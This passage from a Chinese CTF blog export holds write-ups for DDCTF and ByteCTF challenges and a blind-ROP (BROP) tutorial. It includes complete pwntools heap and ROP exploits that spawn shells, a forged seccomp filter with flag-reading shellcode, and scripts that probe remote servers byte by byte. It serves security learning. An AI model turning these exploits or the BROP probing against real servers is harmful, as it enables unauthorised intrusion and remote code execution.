+ p64(elf.got['puts']) + p64(elf.plt['puts'])pay += p64(main)sda("RCTF\n",pay)rc(0x1b)puts_addr = u64(rc(6).ljust(8,'\x00'))show("puts_addr",puts_addr)'''# 调用 puts 的 leak 写法def leak(addr): up = "" data = "" pay = "a"*0x18 + p64(pppp_ret) pay += p64(pop_rdi) + p64(addr) + p64(elf.plt['puts']) pay += p64(main) sda("RCTF\n",pay) rc(0x1b) while True: c = p.recv(numb=1,timeout=0.1) if up == "\n" and c == "W": data = data[:-1] + '\x00' break else: data += c up = c data = data[:8] log.info("%#x =&gt; %s" % (addr, (data or '').encode('hex'))) return data# 调用 write 的 leak 写法def leak(addr): global flag up = "" data = "" pay = 0x18*'a' + p64(pppp_ret) pay += p64(gad1) pay += p64(0) + p64(1) + p64(elf.got['write']) + p64(8) + p64(addr) + p64(1) pay += p64(gad2) + p64(0)*7 pay += p64(main) sda("RCTF\n",pay) if flag: rc(0x1b) data = rc(8) flag += 1 log.info("%#x =&gt; %s" % (addr, (data or '').encode('hex'))) return datad = DynELF(leak,elf = elf)system = d.lookup('system','libc')show("system",system)binsh_addr = elf.bss() + 0x200pay = 0x18*'a' + p64(pppp_ret)pay += p64(gad1)pay += p64(0) + p64(1) + p64(elf.got['read']) + p64(8) + p64(binsh_addr) + p64(0)pay += p64(gad2) + p64(0)*7pay += p64(pop_rdi) + p64(binsh_addr)pay += p64(system)sda("RCTF\n",pay)sleep(0.1)sd('/bin/sh\x00')p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDCTF的两道简单逆向]]></title>
    <url>%2F2020%2F06%2F21%2FDDCTF%E4%B9%8Bre%2F</url>
    <content type="text"><![CDATA[re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA， 逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了， 虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我选择OD一波 这就是加密函数的汇编0x402FF8对应的就是数组 byte_402FF8，在IDA里可以看到，其实就是ASCII码表上的所以有值， 从0x20到0x7e就是可见字符，这个函数里面最核心的就是这句汇编mov dl byte ptr ds:[eax+0x402FF8]，它就是通过你输入的字符，倒着来找，其实就是把0x20~0x7e倒一下然后一一对应就没了（所以就很类似异或），把DDCTF{reverseME}，扔进去再倒一下就能得到正确的输入了 re2这也是一道 32位PE逆向，加了aspack壳，也找个脱壳工具一脱就行，不过有个问题就是，脱完壳不能运行了，不过逻辑是没有错的，所以要动态调的话就用没脱壳的就行 汇编直接逆先说一说头铁的做法，直接OD跟踪写出加密过程，再根据加密过程写去解密脚本，粗略地，的IDA上可以看到第一步检测和第一步加密 检测输入，长度为偶数，只能是[0,9]和[‘A’,’B’] （其实就是限制只能输入16进制数） 第一步加密，这里的加密逻辑还是可以从IDA里看出来的，（说白了就是将输入的字符转成16进制数，两个字符是一个16进制 嘛 ）但是接下来的加密看起来就会有点懵（但是它就只是个base64加密，后面再讲），所以就去OD跟一下看看情况喽 因为用的是未脱壳的程序，在pushad后，下ESP硬件断点，F9运行至popad后 单步到程序的真正入口，就可以搜索到程序的字符，下断，F9过去 单步进去加密函数，接下来就是单步看汇编，整出来的结果就是 12345a = x&gt;&gt;2;b = ((x&amp;3)&lt;&lt;4)+(y&gt;&gt;4);c = ((y&amp;0xf)*4)+(z&gt;&gt;6);d = z&amp;0x3f;(x,y,z为我们输入的三个16进制数（也就是6位字符）) 最后将a,b,c,d拼在一起就是结果 ，出来跟’DDCTF{reverse+}’比较，逆回去其实很简单，就是已知a,b,c,d求，x,y,z，reverse+共8位，所以两次爆破就可以了 1234567891011121314151617181920212223242526for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x1e == (x&amp;3)*16+y/16 &amp;&amp; 0x2f == (y&amp;0xf)*4+z/64 &amp;&amp; 0x1e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125;for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x2c == (x&amp;3)*16+y/16 &amp;&amp; 0x1e == (y&amp;0xf)*4+z/64 &amp;&amp; 0x3e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125; base64 其实这题的正解应该是base64，这也是常规的base64加密，只不过不是以输入字符去加密，而是直接输入16进制，也就是可以加密所有包括不可见字符，第一步转成16进制数就不用再说了，第二步的就是base64编码 所以我们只需要实现一个base64解码，以16进制形式输出就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char base64code[65] = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='&#125;; char s[2048]; gets(s); int l = strlen(s); int t = 0; char a[4]; while(t&lt;l)&#123; char x,y,z; int temp = 0; for(int i=0;i&lt;4;i++)&#123; a[i] = s[t++]; if(a[i]&gt;='A'&amp;&amp;a[i]&lt;='Z') a[i] = a[i]-'A'; else if(a[i]&gt;='a'&amp;&amp;a[i]&lt;='z') a[i] = a[i]-'G'; else if(a[i]&gt;='0'&amp;&amp;a[i]&lt;='9') a[i] = a[i] + 4; else if(a[i] == '=')&#123; a[i] = a[i] + 3; if(t == l)&#123; temp = 1; t = l; break; &#125; else&#123; temp = 2; t = l; break; &#125; &#125; else if(a[i] == '+') a[i] = a[i] + 19; else if(a[i] == '/') a[i] = a[i] + 16; &#125; if(!temp)&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = (a[2]&lt;&lt;6) + (a[3]); &#125; else if(!(temp-1))&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = ' '; &#125; else&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = ' '; z = ' '; &#125; // printf("%c%c%c",x,y,z); printf("%x %x %x ",x&amp;0xff,y&amp;0xff,z&amp;0xff); &#125; printf("\n"); return 0;&#125; 转成大写字母就是flag了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bytectf部分wp]]></title>
    <url>%2F2020%2F06%2F21%2Fbytectf%2F</url>
    <content type="text"><![CDATA[mheap先贴上我觉得最可惜的一道题 程序自已定义了分配原则 12345struct chunk&#123; size_t size; void* next; //only use after free char buf[size];&#125; 并且在程序一开始在0x23330000处申请了0x1000大小的空间当top chunk，以后的每次申请都从这个区域切割 12340x4040d0 --&gt; free列表：free掉的chunk按单链表的形式存放0x4040C0 --&gt; 存放top&apos;s size0x4040C8 --&gt; 存放top chunk0x4040E0 --&gt; chunk列表，最多可存放16个 漏洞点： 123456789101112131415161718192021__int64 __fastcall my_read(__int64 a1, signed int a2)&#123; __int64 result; // rax signed int v3; // [rsp+18h] [rbp-8h] int v4; // [rsp+1Ch] [rbp-4h] v3 = 0; do &#123; result = v3; if ( v3 &gt;= a2 ) break; v4 = read(0, (a1 + v3), a2 - v3); if ( !v4 ) exit(0); v3 += v4; result = *(v3 - 1LL + a1); &#125; while ( result != 10 ); return result;&#125; 最有意思的也是最容易忽略的，当a1+v3超0x23331000时，read返回-1，而!-1 != 1所以可以实现向上读，之后只需要伪造一next指针即可，但是这个伪造块的size在远程似乎很有讲究，最终还是没能找到适合的size exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./mheap') elf = ELF('./mheap') libc = elf.libcelse: p = remote("112.126.98.5","9999") elf = ELF('./mheap') libc = ELF('./libc-2.27.so')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def alloc(id,size,data): ru("choice: ") sl("1") ru("Index: ") sl(str(id)) ru("size: ") sl(str(size)) ru("Content: ") sd(data)def show(id): ru("choice: ") sl("2") ru("Index: ") sl(str(id))def free(id): ru("choice: ") sl("3") ru("Index: ") sl(str(id))def edit(id,data): ru("choice: ") sl("4") ru("Index: ") sl(str(id)) sd(data)# chunk = 0x4040E0# 0x4040C0 --&gt; top_chunk's size# 0x4040C8 --&gt; top_chunk# 0x4040d0 --&gt; free 列表alloc(1,0x10,'a'*0x10)free(1)alloc(0,0xfe0-0x20,'\x00'*(0xfe0-0x20))# gdb.attach(p,"b *0x40154E")# gdb.attach(p,"b *0x4011EA")pay = p64(0x4040d0) + 'a'*(0xff0-1)# gdb.attach(p,"b *0x4011EA")size = 0x23330000 alloc(1,0xfff,pay)sl('')# gdb.attach(p,"b *0x40154E")alloc(4,size-0x10,p64(elf.got['puts']) + p64(elf.got['atoi']) + '/bin/sh\x00' + '\n')# gdb.attach(p)show(0)one_local = [0x45216,0x4526a,0xf02a4,0xf1147]one_remote = [0x4f2c5,0x4f322,0x10a38c]puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']onegadget = one_local[0] + libc_basesystem = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()log.info("puts_addrts --&gt; %s",hex(puts_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))log.info("binsh_addr --&gt; %s",hex(binsh_addr))log.info("onegadget --&gt; %s",hex(onegadget))# gdb.attach(p)edit(1,p64(system) + '\n')ru("choice: ")sl('/bin/sh')# gdb.attach(p)p.interactive() mulnote程序丑到爆炸，但是就是一个简单的UAF exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./mulnote') elf = ELF('./mulnote') libc = elf.libcelse: p = remote("112.126.101.96","9999") elf = ELF('./mulnote') libc = ELF('./libc.so')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,note): ru("&gt;") sl("C") ru("size&gt;") sl(str(size)) ru("note&gt;") sl(note)def edit(id,note): ru("&gt;") sl("E") ru("index&gt;") sl(str(id)) ru("note&gt;") sl(note)def Remove(id): ru("&gt;") sl("R") ru("index&gt;") sl(str(id))def show(): ru("&gt;") sl("S")create(0x80,'b')#0create(0x18,'a'*0x18)#1Remove(0)show()ru("[0]:\n")one_local = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = u64(rc(6).ljust(8,'\x00')) - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']onegadget = libc_base + one_local[1]fack_chunk = malloc_hook - 0x23log.info("main_arena --&gt; %s",hex(main_arena))log.info("malloc_hook --&gt; %s",hex(malloc_hook))log.info("libc_base --&gt; %s",hex(malloc_hook))log.info("onegadget --&gt; %s",hex(onegadget))log.info("fack_chunk --&gt; %s",hex(fack_chunk))create(0x68,'a')#2create(0x68,'b')#3Remove(2)Remove(3)Remove(2)pay = p64(fack_chunk)create(0x68,pay)create(0x68,'a')create(0x68,'b')pay = 0x13*'a' + p64(onegadget)create(0x68,pay)ru("&gt;")sl("C")ru("size&gt;")sl('32')# debug()p.interactive() vip分析程序可以看到，在edit函数中有个任意长度的堆溢出 1234567891011ssize_t __fastcall sub_4014A8(void *a1, int a2)&#123; int fd; // [rsp+1Ch] [rbp-4h] if ( dword_4040E0 ) return read(0, a1, a2); fd = open("/dev/urandom", 0); if ( fd == -1 ) exit(0); return read(fd, a1, a2);&#125; 但是前提是dword_4040E0不为0，否则溢出的也只是不可控的随机数 程序的run函数中调用了prtcl函数，而它的第7个参数刚好能被覆盖到0x30字节，所以可以伪造6条沙盒规则，这里我们把open函数关闭（return ERROR(0)），顺便打开mprotect绕过NX，那么前面提到的open(&quot;/dev/urandom&quot;)就会返回0，使得read(fd,a1,a2) == read(0,a1,a2)，接下来就tcache了,但是因为execve函数被禁用了，所以这里用写shellcode直接读flag。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144from pwn import *context(arch = 'amd64' , os = 'linux')context.terminal = ['tmux', 'splitw', '-h']context.log_level = "debug"p = process("./vip")#p = remote("112.126.103.14", 9999)ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b)slog = lambda x : log.success(x)flog = lambda x : log.success(x)libc = ELF("./libc-2.27.so")def choose(idx): sla(": ", str(idx))def alloc(idx): choose(1) sla(": ", str(idx))def show(idx): choose(2) sla(": ", str(idx))def free(idx): choose(3) sla(": ", str(idx))def edit(idx, size, ctx): choose(4) sla(": ", str(idx)) sla(": ", str(size)) sa(": ", ctx)def rule(code,jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k) #def build_rule():# payload = ''# payload+= rule(0x20 ,0x00, 0x00, 0x00000004) # A = arch# payload+= rule(0x15 ,0x00, 0x03, 0xc000003e) # if (A != ARCH_X86_64) goto 0010# payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = sys_number# payload+= rule(0x15 ,0x01, 0x00, 0x00000002) # if (A == open) goto 0006# payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) # return ALLOW# # payload+= rule(0x15 ,0x03, 0x00, 0x0000003b) # if (A == execve) goto 0005# payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2)# return payloaddef build_rule(): payload = '' payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = arch payload+= rule(0x15 ,0x07, 0x00, 0x00000001) # if (A == write) goto 0009 payload+= rule(0x15 ,0x06, 0x00, 0x00000000) # if (A == read) goto 0009 payload+= rule(0x15 ,0x05, 0x00, 0x0000000a) # if (A == mprotect) goto 0009 payload+= rule(0x15 ,0x04, 0x00, 0x40000002) # if (A == open) goto 0009 payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadfor i in range(15): alloc(i)pay = "a"*0x20+build_size()print hex(len(pay))pause()choose(6)sa("name: \n", pay)p.interactive()edit(0, 0x70, "a"*0x50+p64(0)+p64(0x421))#gdb.attach(p)free(1)alloc(0)show(0)leak = ru("\x7f").ljust(8, "\x00")leak = u64(leak)libc.address = leak-0x3ec090log.info("libc.address --&gt; %s",hex(libc.address))alloc(0)alloc(1)free(6)free(7)free(8)free(9)free(0)edit(2, 16, p64(libc.symbols['__free_hook']))alloc(4)alloc(3)free(2)edit(4, 20, p64(0x404140))alloc(0)alloc(0)edit(3, 0x20, p64(libc.symbols['setcontext']+53))frame = SigreturnFrame()frame.rsp = 0x404150frame.rip = libc.symbols["mprotect"]frame.rdx = 0x7frame.rsi = 0x1000frame.rdi = 0x404000payload = "./flag\x00\x00"payload += p64(0)payload += p64(0x404260) + p64(1) + p64(1)*32code = ''' mov rdi, 0x404140; mov rsi, 0; mov rdx, 0; mov eax, 0x40000002; syscall; mov rdi, 3; mov rsi, 0x404160; mov rdx, 100; mov eax, 0; syscall; mov rdi, 1; mov rsi, 0x404160; mov rdx, 100; mov eax, 1; syscall;'''payload += asm(code)edit(0, 0x1000, payload)edit(4, 0x300, str(frame))free(4)p.interactive() MISCbetgame第一关：b –&gt; s ; j –&gt; b ; s – j ; 第二关：j –&gt; s ; s –&gt; b ; b –&gt; j; 第三关：s –&gt; s ; b –&gt; b ; j –&gt; j; 写个脚本跑一通就行了 1234567891011121314151617181920212223from pwn import *context.log_level ='debug'p = remote("112.125.25.81","9999")for i in range(30): p.recvuntil("use: ") s = p.recv(1) if i%3 == 0: p.sendline(s) elif i%3 == 1: if s == 'j': p.sendline("b") elif s == 's': p.sendline("j") else : p.sendline("s") else : if s == 'j': p.sendline("s") elif s == 's': p.sendline("b") else : p.sendline("j")p.interactive() jigsaw拼图出flag2333 CRYPTOlrlraes随机数漏洞加广播攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import gmpy2import libnumfrom Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom Crypto.Cipher import AESfrom randcrack import RandCrackimport randomdef GCRT(mi, ai): assert( isinstance (mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a ) in zip(mi[1:],ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura k = c // d *libnum.invmod(curm // d, m // d) cura += curm * k curm = curm * m // d cura %= curm return (cura %curm, curm)rc = RandCrack()r = []fd = open("old","r")out = fd.readline()while out: r.append(int(out.strip('\n'),10)) out = fd.readline()# print rfor i in r[-624:]: rc.submit(i)for i in range(24): rc.predict_getrandbits(128)p = []for i in range(48): predict = rc.predict_getrandbits(128) p.append(predict)# print pfd = open("new","r")out = fd.readline()cn = []while out: cn.append(long_to_bytes(int(out.strip('\n'),16)))# print out out = fd.readline()# print cnmn = []clist = []for i in range(24): key = long_to_bytes(p[24+i]) h = AES.new(key, AES.MODE_CBC, b"\x00"*16) cnow = h.decrypt(cn[i]) key = long_to_bytes(p[i]) h = AES.new(key, AES.MODE_CBC, b"\x00"*16) mnow = h.decrypt(cnow) mn.append(mnow)clist = list(map(bytes_to_long, mn))# print clistnlist = []fd = open("cl","r")out = fd.readline()while out: nlist.append(int(out.strip('\n')[2:-1],16)) out = fd.readline()# print nlistm = GCRT(nlist, clist)[0]# print me = 17if gmpy2.iroot(m, e)[1] == 1: flag = gmpy2.iroot(m, e)[0] print flag# 61406796444626535559771097418338494728649815464609781204026855332620301752444 然后z3解方程 123456789101112131415161718192021from z3 import *seed = BitVec("f", 256+1)c = 0x10000000000000000000000000000000000000000000000000000000000000223m = 61406796444626535559771097418338494728649815464609781204026855332620301752444def calc(f): p = 0 for i in range(256-1, -1, -1): p = p * 2 p = If(Extract(i, i, f)==1, p^f, p) p = If(LShR(p, 256)==1, p^c, p) return psolver = Solver()solver.add(m==calc(seed))solver.add(Extract(256, 256, seed)==0)for i in range(7, 257, 8): solver.add(Extract(i, i, seed)==0)print(solver)if solver.check() == sat: print(solver.model())flag&#123;very_simple_random_problem&#125; REVERSE驱动逆向分析下来可以发现是AES加密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485char *__fastcall sub_140002DD0(char *a1)&#123; char *result; // rax char v2; // [rsp+20h] [rbp-158h] char v3; // [rsp+21h] [rbp-157h] char v4[64]; // [rsp+E0h] [rbp-98h] char iv; // [rsp+120h] [rbp-58h] char md5_key; // [rsp+130h] [rbp-48h] char *v7; // [rsp+180h] [rbp+8h] v7 = a1; v2 = 0; memset(&amp;v3, 0, 0xBFui64); v4[0] = 0x89u; v4[1] = 0xB7u; v4[2] = 0xEEu; v4[3] = 0xD5u; v4[4] = 0x7E; v4[5] = 0xDFu; v4[6] = 0xBEu; v4[7] = 0x67; v4[8] = 0xBBu; v4[9] = 0xEDu; v4[10] = 0xC3u; v4[11] = 0x6D; v4[12] = 0x51; v4[13] = 0x74; v4[14] = 0xAEu; v4[15] = 0x53; v4[16] = 3; v4[17] = 0xA4u; v4[18] = 0x60; v4[19] = 0xD3u; v4[20] = 0xE7u; v4[21] = 0xF5u; v4[22] = 0xA1u; v4[23] = 0xDEu; v4[24] = 7; v4[25] = 0x6B; v4[26] = 0x25; v4[27] = 0xD7u; v4[28] = 0x57; v4[29] = 0xCEu; v4[30] = 0xC2u; v4[31] = 0x6F; v4[32] = 0xD3u; v4[33] = 0xA5u; v4[34] = 0xFFu; v4[35] = 0xD7u; v4[36] = 0x8Cu; v4[37] = 0x54; v4[38] = 0x16; v4[39] = 0x9Fu; v4[40] = 0xE3u; v4[41] = 0xBFu; v4[42] = 2; v4[43] = 0x14; v4[44] = 0x9Eu; v4[45] = 7; v4[46] = 0xBEu; v4[47] = 0xB2u; v4[48] = 0x6D; v4[49] = 0x28; v4[50] = 0x65; v4[51] = 0x94u; v4[52] = 0x19; v4[53] = 0xE1u; v4[54] = 0x51; v4[55] = 0xDFu; v4[56] = 0x7E; v4[57] = 0x76; v4[58] = 0xA3u; v4[59] = 0xC3u; v4[60] = 0xB2u; v4[61] = 0x3B; v4[62] = 0xA6u; v4[63] = 0x69; qmemcpy(&amp;md5_key, &amp;::md5_key, 0x20ui64); qmemcpy(&amp;iv, ::iv, 0x10ui64); sub_1400010D0(&amp;v2, &amp;md5_key, &amp;iv); sub_140001000(&amp;v2, v4, 0x40u); result = v4; qmemcpy(v7, v4, 0x40ui64); return result;&#125; 这里v4是密文 ，md5key是通过伪造的“Fakelntel”分4段进行计算的结果 ：key = b”\x52\xa9\x65\x08\xc3\x95\x36\xf0\xc2\x42\x53\x9b\x77\x17\xfb\xc6” IV由题目给出：25 40 5a 86 b5 f1 3e 58 80 9b db 0b 30 49 66 8c 123456789101112from Crypto.Hash import MD5from Crypto.cipher import AESimport binasciiiv = b"\x25\x40\x5a\x86\xb5\xf1\x3e\x58\x80\x9b\xdb\x0b\x30\x49\x66\x8c"key = b"\x52\xa9\x65\x08\xc3\x95\x36\xf0\xc2\x42\x53\x9b\x77\x17\xfb\xc6"M = [137, 183, 238, 213, 126, 223, 190, 103, 187, 237, 195, 109, 81, 116, 174, 83, 3, 164, 96, 211, 231, 245, 161, 222, 7, 107, 37, 215, 87, 206, 194, 111, 211, 165, 255, 215, 140, 84, 22, 159, 227, 191, 2, 20, 158, 7, 190, 178, 109, 40, 101, 148, 25, 225, 81, 223, 126, 118, 163, 195, 178, 59, 166, 105]M = bytes(M)handle = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)m = handle.decrypt(M)print(m)# "bytectf&#123;d0f20eff6fc4f6060776c8ca63319a1e&#125;"]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bline rop填坑]]></title>
    <url>%2F2020%2F06%2F21%2Fbrop%E5%A1%AB%E5%9D%91%2F</url>
    <content type="text"><![CDATA[由于初学也是因为太笨的原因一直没有彻底学习一下brop，今天因为某些原因必须做一道 brop 把自己逼出来了 写在前面BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是Standford的Andrea Bittau，以下是相关的paper和slide链接： paper slide 以及BROP的原网站地址 BROP攻击的目标和前提条件目标：通过ROP的方法远程攻击某个应用程序 ，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX , ASLR , PIE , stack canaries等保护，应用程序所在的服务器可以是32位系统也可以是64位系统 。 而这个攻击实现的两个前提条件是： 1、必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞； 2、服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand(意味着虽然有ASLR保护，但是复活的程序和之前 的进程的地址随机化是一样的)。这个需求其实是合理的，因为当前像nginx , MySQL , Apache , OpenSSH , Samba等服务器应用都是符合这种特性的。 BROP的攻击流程远程dump内存由于我们不知道被攻击程序的内存布局，所以首先要做的就是通过某种方式从远程服务器dump出程序的内存到本地，为了做到这点我们需要调用一个系统调用write或puts等的打印函数，但是ROP攻击的角度来看，我们需要的pop rdi`pop rsi`等的gadgets地址并不知道，特别是当系统 部署了canary 就更难了。 所以我们先把这个问题放一放，先记着这个目标，先解决路上的障碍 攻破Stack Canaries保护作者提出了一种叫做”stack reading”的方法： 假设这是我们要overflow的栈布局： 首先我们可以尝试任意多次判断overflow的长度（直到canary被破坏crash了）之后我们将buffer填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，（因为程序重启canary不变），由于一个字节只有256种可能，所以我们最多尝试256次就可以找到canary 的某个正确的字节，直到进8个字节的canary 都完整得找到 寻找stop gadget到目前为止，我们已经找到了合适的canary绕过stack canary 的保护，接下来我们需要寻找一个特殊的gadgets：stop gadget。 一般情况下，如果我们把栈上的return address覆盖成某些我们随意选取的地址的话，程序 很大程度会crash掉，从而使得攻击者的连接(connection)被关闭，但是存在另外一种情况，即该return address指向了一块代码区域，当程序的执行流跳到那里之后，程序不会crash，而是进入了无限循环，（比如回到main函数，回到start函数）攻击者能一直保持连接状态。这样的地址我们称之为stop gadget，这种gadget对于寻找其它的gadgets取到了至关重要的作用 寻找brop_gadget当有了stop gadget，我们就可以继续寻找其它有用的gadget（useful gadget)（比如pop rdi这些） 在没有stop gadget之前 我们是无法确定useful gadget的；假设我们猜到一个useful gadget如pop rdi ;ret，但是由于执行完这个gadget后进程还是会跳到下一个地址，如果该地址是一个非法地址，那么进程到最后还是会carch，在这个过程中攻击者其实不知道这个userful gadget已经执行过了，他看到的结果是程序crash了，从而不认为这是个userful gadget而放弃它 但是如果我们有了stop gadget，那就不一样了，如果我们在需要尝试的gadgets 后面填上了足够多的stop gadget，如图 这样，如果尝试的gadget 是useful gadget的话程序 就不会crash。 brop gadget：在libc_csu_init的结尾有一长串的 gadget ，我们可以通过偏移来获取 pop rdi;ret和pop rsi ; pop r15 ; ret这两个gadget，如图： 用上面提到的找 useful gatget的方法就很容易找到这个brop gadget了 寻找plt项程序的plt表具有比较规整的结构 ，第一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的韩寒苏解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got 地址进行解析。 另外 ，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。 控制 RDX对于没有puts函数的程序来说，一般用来dump 的函数是write，于是就有一个问题，write需要3个参数，也就是说rdx也需要控制 ，但是一般程序中是不存在pop rdx;ret这样的gadget的；所以作者提出，相比于寻找pop rdx指令，他认为可以利用strcmp这个函数调用，该函数调用会把字符串的长度赋值给rdx，从而达到相同的效果。需要提醒的是，并不是所有程序都会调用strcmp函数，当程序中没有strcmp 函数的情况下，我们就得利用其它的方式来控制 rdx 了 那么，我们如何确定 strcmp 函数的plt地址呢？ 对于strcmp 来说，作者提出的方法是对其传入不同的参数组合，通过该方法调用返回的结果来进行判断 ，因为brop gadget的存在，所以我们可以很方便地控制前两个参数，strcmp 会发生如下可能的情况： 1234strcmp(bad,bad)strcmp(bad,readable)strcmp(readable,bad)strcmp(readable,readable) 只有最后一种格式，程序才会正常执行； 注：在没有 PIE 保护的时候，64位程序 的ELF文件的0x400000处有7个非零字节 那么我们该如何具体去做呢？一种比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个比较麻烦，我们可以选择如下的一种方法 利用 plt 表项的慢路径 并且利用下一个表项的慢路径的地址来覆盖返回地址 这样，我们就不用来回控制 相应的变量了。 当然我们也可能碰巧到到 strncmp 或 strcasecmp 函数，它们和 strcmp 函数具有一样的效果 寻找输出函数寻找put@plt我们已经可以控制 rdi 了，在没有开启 PIE 的情况下，0x400000 处为ELF文件的头部，其内容为\x7fELF，所以我们可以通过打印 0x400000来判断是否为put@plt 寻找write@plt这个，如果可能调用wite(1,buf,len)的话就跟上面找puts一样，但是对于寻找或者怎么执行write(socket,buf,len)，菜鸡还是没搞懂，这里就涉及到寻找文件描述符的事情 ，先挖个坑，有机会来填。。。。。 回到最初的目的——dump 文件其实不用dump整个文件，我们可以选择dump程序的前一部分，一般0x400000~0x4001000就够，因为这部分包含了plt表，在plt表中我们就可以得到got表地址，之后再打印got表拿到真实地址后就可以实施攻击了。 例子还是需要具体的题目来练练手才靠谱 HCTF2016出题人失踪了，我们可以本地把docker搭起来模拟远程 1、确定栈溢出长度123456789101112131415161718# step 1def get_overflow_len(): i = 1 while True: try: p = remote("127.0.0.1","7777") p.sendafter("password?\n",i*'a') output = p.recv() p.close() if not "password" in output: return i-1 else: i += 1 except EOFError: p.close() return i-1# print get_overflow_len() #72 通过上面的函数我们可以确定，栈溢出的长度为72，并且通过回显的信息可以发现程序并没有开启canary，所以直接开始寻找stop gadget 2、寻找gadget1234567891011121314151617# step 2def get_stop_addr(lenth): addr = 0x400000 while True: try: p = remote("127.0.0.1","7777") p.sendafter("password?\n","a"*lenth + p64(addr)) p.recv() p.close() log.success("one success addr %s",hex(addr)) return addr except EOFError: addr += 1 p.close()# print get_stop_addr(72) #0x4006b6stop_gadget = 0x4006b6 这里我们直接尝试64位程序没有开PIE的情况，结果发现了不少地址，我们选取一个貌似返回于是源程序 中的地址 one success addr 0x4006b6 3、寻找brop_gadget12345678910111213141516171819202122232425262728293031323334353637383940414243444546# step 3def get_brop_gadget(lenth,stop_gadget,addr): try: p = remote("127.0.0.1","7777") pay = 'a'*lenth + p64(addr) + p64(0)*6 + p64(stop_gadget) + p64(0)*10 